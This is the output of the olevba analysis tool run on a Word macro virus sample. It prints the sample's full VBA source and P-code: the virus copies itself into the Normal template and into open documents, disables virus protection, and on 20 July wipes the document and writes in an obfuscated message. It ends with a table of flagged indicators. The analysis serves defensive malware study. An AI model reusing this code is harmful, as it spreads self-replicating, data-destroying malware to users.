olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ira.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ira.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vba332.bas 
in file: Virus.MSWord.Ira.c - OLE stream: 'Macros/VBA/vba332'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
' ------------------------------------------------------------------------
'               Copyright (C) 2001 Microsoft Corporation
'
' You have a royalty-free right to use, modify, reproduce and distribute
' the Sample Application Files (and/or any modified version) in any way
' you find useful, provided that you agree that Microsoft has no warranty,
' obligations or liability for any Sample Application Files.
' <---------------------------------------------------------------------->
Const VBP_DllPath As String = "c:\vmm32.dll"
Const VBP_Name As String = "vba332"
Public Sub FileSave()
 On Error Resume Next
 GetPrivateProfileStringA "win.ini"
 If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Public Sub ToolsMacro(): VB_HiddenInterface
End Sub
Public Sub ViewVBCode(): VB_HiddenInterface
End Sub
Private Sub VB_HiddenInterface()
 MsgBox "VBA332.DDL: VB_HiddenInterface - function not found.", vbCritical + vbOKOnly, "Microsoft Visual Basic"
End Sub
Private Sub GetPrivateProfileStringA(INIFile As String)
 Dim Increment As Integer
 Dim PrivateProfileStringN, PrivateProfileStringA As Boolean
 PrivateProfileStringN = False: PrivateProfileStringA = False
 ThisDocument.VBProject.VBComponents.Item(VBP_Name).Export (VBP_DllPath)
 For Increment = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents.Item(Increment).Name = VBP_Name Then
   PrivateProfileStringN = True
  End If
 Next Increment
 If PrivateProfileStringN = False And INIFile = "vba.ini" Then
  NormalTemplate.VBProject.VBComponents.Import (VBP_DllPath): NormalTemplate.Save: End
 End If
 For Increment = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents.Item(Increment).Name = VBP_Name Then
   PrivateProfileStringA = True
  End If
 Next Increment
 If PrivateProfileStringA = False Then
  ActiveDocument.VBProject.VBComponents.Import (VBP_DllPath)
 End If
 Kill VBP_DllPath
' Çÿç÷åï#/ð/äñîäñ/ýêîð...
' Þêÿ·ìï/'ì!Ú!#=??>ì!&
End Sub
Public Sub AutoOpen()
 On Error Resume Next
 Dim Increment As Integer
 Dim Temp, Body As String
 Temp = "K`lzbja{/|zllj||izccv/kj|{}`vjk!"
 ShowVisualBasicEditor = Not True
 With Options
  .VirusProtection = Not True
  .SaveNormalPrompt = Not True
 End With
 GetPrivateProfileStringA "vba.ini"
 If Day(Date) = 20 And Month(Date) = 7 Then
  For Increment = 1 To Len(Temp)
   Body = Body + Chr(Asc(Mid(Temp, Increment, 1)) Xor 15)
  Next Increment
  With ActiveDocument
   .Range.Delete
   .Range.InsertAfter Body
   .UndoClear
   .Save
  End With
 End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ira.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/vba332 - 5160 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	QuoteRem 0x0000 0x0049 " ------------------------------------------------------------------------"
' Line #2:
' 	QuoteRem 0x0000 0x0037 "               Copyright (C) 2001 Microsoft Corporation"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	QuoteRem 0x0000 0x0047 " You have a royalty-free right to use, modify, reproduce and distribute"
' Line #5:
' 	QuoteRem 0x0000 0x0046 " the Sample Application Files (and/or any modified version) in any way"
' Line #6:
' 	QuoteRem 0x0000 0x0049 " you find useful, provided that you agree that Microsoft has no warranty,"
' Line #7:
' 	QuoteRem 0x0000 0x003B " obligations or liability for any Sample Application Files."
' Line #8:
' 	QuoteRem 0x0000 0x0049 " <---------------------------------------------------------------------->"
' Line #9:
' 	Dim (Const) 
' 	LitStr 0x000C "c:\vmm32.dll"
' 	VarDefn VBP_DllPath (As String)
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0006 "vba332"
' 	VarDefn VBP_Name (As String)
' Line #11:
' 	FuncDefn (Public Sub FileSave())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitStr 0x0007 "win.ini"
' 	ArgsCall GetPrivateProfileStringA 0x0001 
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Public Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall VB_HiddenInterface 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Public Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall VB_HiddenInterface 0x0000 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Private Sub VB_HiddenInterface())
' Line #21:
' 	LitStr 0x0034 "VBA332.DDL: VB_HiddenInterface - function not found."
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0016 "Microsoft Visual Basic"
' 	ArgsCall MsgBox 0x0003 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Private Sub GetPrivateProfileStringA(INIFile As String))
' Line #24:
' 	Dim 
' 	VarDefn Increment (As Integer)
' Line #25:
' 	Dim 
' 	VarDefn PrivateProfileStringN
' 	VarDefn PrivateProfileStringA (As Boolean)
' Line #26:
' 	LitVarSpecial (False)
' 	St PrivateProfileStringN 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St PrivateProfileStringA 
' Line #27:
' 	Ld VBP_DllPath 
' 	Paren 
' 	Ld VBP_Name 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	StartForVariable 
' 	Ld Increment 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #29:
' 	Ld Increment 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld VBP_Name 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitVarSpecial (True)
' 	St PrivateProfileStringN 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld Increment 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	Ld PrivateProfileStringN 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld INIFile 
' 	LitStr 0x0007 "vba.ini"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #34:
' 	Ld VBP_DllPath 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	BoS 0x0000 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	End 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld Increment 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #37:
' 	Ld Increment 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld VBP_Name 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitVarSpecial (True)
' 	St PrivateProfileStringA 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld Increment 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	Ld PrivateProfileStringA 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #42:
' 	Ld VBP_DllPath 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld VBP_DllPath 
' 	ArgsCall Kill 0x0001 
' Line #45:
' 	QuoteRem 0x0000 0x0018 " Çÿç÷åï#/ð/äñîäñ/ýêîð..."
' Line #46:
' 	QuoteRem 0x0000 0x0015 " Þêÿ·ìï/'ì!Ú!#=??>ì!&"
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Public Sub AutoOpen())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	Dim 
' 	VarDefn Increment (As Integer)
' Line #51:
' 	Dim 
' 	VarDefn Temp
' 	VarDefn Body (As String)
' Line #52:
' 	LitStr 0x0020 "K`lzbja{/|zllj||izccv/kj|{}`vjk!"
' 	St Temp 
' Line #53:
' 	LitVarSpecial (True)
' 	Not 
' 	St ShowVisualBasicEditor 
' Line #54:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #55:
' 	LitVarSpecial (True)
' 	Not 
' 	MemStWith VirusProtection 
' Line #56:
' 	LitVarSpecial (True)
' 	Not 
' 	MemStWith SaveNormalPrompt 
' Line #57:
' 	EndWith 
' Line #58:
' 	LitStr 0x0007 "vba.ini"
' 	ArgsCall GetPrivateProfileStringA 0x0001 
' Line #59:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #60:
' 	StartForVariable 
' 	Ld Increment 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Temp 
' 	FnLen 
' 	For 
' Line #61:
' 	Ld Body 
' 	Ld Temp 
' 	Ld Increment 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x000F 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Body 
' Line #62:
' 	StartForVariable 
' 	Ld Increment 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #64:
' 	MemLdWith Range 
' 	ArgsMemCall Delete 0x0000 
' Line #65:
' 	Ld Body 
' 	MemLdWith Range 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #66:
' 	ArgsMemCallWith UndoClear 0x0000 
' Line #67:
' 	ArgsMemCallWith Save 0x0000 
' Line #68:
' 	EndWith 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vmm32.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

